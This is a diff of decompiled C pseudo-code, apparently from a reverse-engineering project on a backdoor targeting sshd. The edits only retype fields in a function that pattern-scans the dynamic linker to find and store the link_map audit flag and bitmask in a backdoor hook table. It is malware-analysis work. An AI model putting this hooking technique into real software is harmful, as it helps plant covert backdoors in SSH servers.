@@ -16,7 +16,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
 {
   imported_funcs_t *imports;
   libc_imports_t *libc_imports;
-  u32 *register_filter;
+  instruction_register_bitmap_t *register_filter;
   backdoor_hooks_data_t *hook_table;
   uchar decoded_mask_register;
   BOOL success;
@@ -116,9 +116,10 @@ BOOL find_link_map_l_audit_any_plt_bitmask
             computed_slot_ptr = insn_ctx.instruction + (long)(insn_ctx.mem_disp + insn_ctx.instruction_size);
           }
           // AutoDoc: Only advance once the LEA recomputes the expected displacement and the register filter allows it.
-          if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == computed_slot_ptr) &&
-             (((int)(uint)*(ushort *)search_ctx->output_register >> (decoded_pointer_register & 0x1f) & 1U) != 0)) {
-            *(u8 *)((long)search_ctx->output_register + 2) = decoded_mask_register;
+          if (((u8 *)(ulong)(search_ctx->offset_to_match).dwords.offset == computed_slot_ptr) &&
+             (((int)(uint)(search_ctx->output_register->fields).allowed_regs >> (decoded_pointer_register & 0x1f) & 1U
+              ) != 0)) {
+            (search_ctx->output_register->fields).reg_index = decoded_mask_register;
             pattern_state = AUDIT_PAT_EXPECT_MOV;
           }
         }
@@ -131,15 +132,15 @@ BOOL find_link_map_l_audit_any_plt_bitmask
           if ((insn_ctx.prefix.flags_u32 & 0x1040) == 0) {
             decoded_mask_register = 0;
             if ((insn_ctx.prefix.flags_u32 & 0x40) != 0) goto LAB_00104d83;
-            if (*(char *)((long)register_filter + 2) != '\0') goto LAB_00104e97;
+            if ((register_filter->fields).reg_index != '\0') goto LAB_00104e97;
             decoded_register = 0;
 LAB_00104da0:
-            if (search_ctx->output_register[2] != decoded_pointer_register) goto LAB_00104da9;
+            if ((search_ctx->output_register->fields).reg_index != decoded_pointer_register) goto LAB_00104da9;
           }
           else {
             if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
               if ((insn_ctx.prefix.flags_u32 & 0x1000) == 0) {
-                if (*(char *)((long)register_filter + 2) == '\0') {
+                if ((register_filter->fields).reg_index == '\0') {
                   decoded_mask_register = 0;
                   decoded_register = 0;
                   goto LAB_00104da0;
@@ -165,10 +166,11 @@ LAB_00104d83:
                          (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
               }
             }
-            decoded_register = *(byte *)((long)register_filter + 2);
+            decoded_register = (register_filter->fields).reg_index;
             if (decoded_register == decoded_mask_register) goto LAB_00104da0;
 LAB_00104da9:
-            if ((decoded_pointer_register != decoded_register) || (search_ctx->output_register[2] != decoded_mask_register)) goto LAB_00104e97;
+            if ((decoded_pointer_register != decoded_register) || ((search_ctx->output_register->fields).reg_index != decoded_mask_register))
+            goto LAB_00104e97;
           }
           pattern_state = AUDIT_PAT_EXPECT_TEST;
           bit_test_register = decoded_pointer_register;
@@ -208,7 +210,8 @@ LAB_00104da9:
           if ((insn_ctx.imm_zeroextended < 0x100) &&
              (mask_bitcount = count_bits(insn_ctx.imm_zeroextended), mask_bitcount == 1)) {
             hook_table = search_ctx->hooks;
-            audit_flag_slot = data->runtime_data->sshd_link_map + *(uint *)&search_ctx->offset_to_match;
+            audit_flag_slot = data->runtime_data->sshd_link_map +
+                      (search_ctx->offset_to_match).dwords.offset;
             (hook_table->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = audit_flag_slot;
             (hook_table->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)insn_ctx.imm_zeroextended;
             if ((audit_flag_slot->_opaque & insn_ctx.imm_zeroextended) == 0) {
